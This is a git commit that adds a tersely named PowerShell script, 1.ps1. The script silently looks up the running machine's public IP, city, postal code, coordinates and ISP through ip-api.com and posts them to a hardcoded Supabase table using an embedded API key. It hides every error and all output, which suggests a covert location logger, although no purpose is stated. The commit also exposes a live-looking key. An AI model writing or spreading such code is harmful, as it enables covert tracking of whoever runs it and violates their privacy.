7c7f79172dae66c814bab955fde2dec4b9a962ce
Im4Theone <kaloyankrastev2013@gmail.com>
2026-08-14 22:07:23 +0300

    Add files via upload

---
+++ 1.ps1
@@ -0,0 +1,57 @@
+[CmdletBinding()]
+param(
+    [Parameter(Mandatory = $false)]
+    [string]$SupabaseUrl = "https://xnqqunnnyifoduksffjq.supabase.co",
+
+    [Parameter(Mandatory = $false)]
+    [string]$SupabaseApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhucXF1bm5ueWlmb2R1a3NmZmpxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY3Mjg3NDAsImV4cCI6MjEwMjMwNDc0MH0.hICo7htTHD6QC5PQTPpikyjgPPUP4N6ZZfUepv4lBl8",
+
+    [Parameter(Mandatory = $false)]
+    [string]$TableName = "ip_lookups"
+)
+
+$ErrorActionPreference = 'SilentlyContinue'
+
+try {
+    $response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,message,query,city,regionName,country,countryCode,zip,lat,lon,isp,org,timezone" -Method Get
+
+    if ($response.status -eq 'success') {
+        $result = [PSCustomObject]@{
+            PublicIP    = $response.query
+            City        = $response.city
+            Region      = $response.regionName
+            Country     = "$($response.country) ($($response.countryCode))"
+            PostalCode  = $response.zip
+            Latitude    = $response.lat
+            Longitude   = $response.lon
+            ISP         = $response.isp
+            Org         = $response.org
+            TimeZone    = $response.timezone
+        }
+
+        $endpoint = "$($SupabaseUrl.TrimEnd('/'))/rest/v1/$TableName"
+
+        $headers = @{
+            "apikey"        = $SupabaseApiKey
+            "Authorization" = "Bearer $SupabaseApiKey"
+            "Content-Type"  = "application/json"
+            "Prefer"        = "return=representation"
+        }
+
+        $body = @{
+            public_ip   = $result.PublicIP
+            city        = $result.City
+            region      = $result.Region
+            country     = $result.Country
+            postal_code = $result.PostalCode
+            latitude    = $result.Latitude
+            longitude   = $result.Longitude
+            isp         = $result.ISP
+            org         = $result.Org
+            time_zone   = $result.TimeZone
+        } | ConvertTo-Json
+
+        Invoke-RestMethod -Uri $endpoint -Method Post -Headers $headers -Body $body | Out-Null
+    }
+}
+catch {}
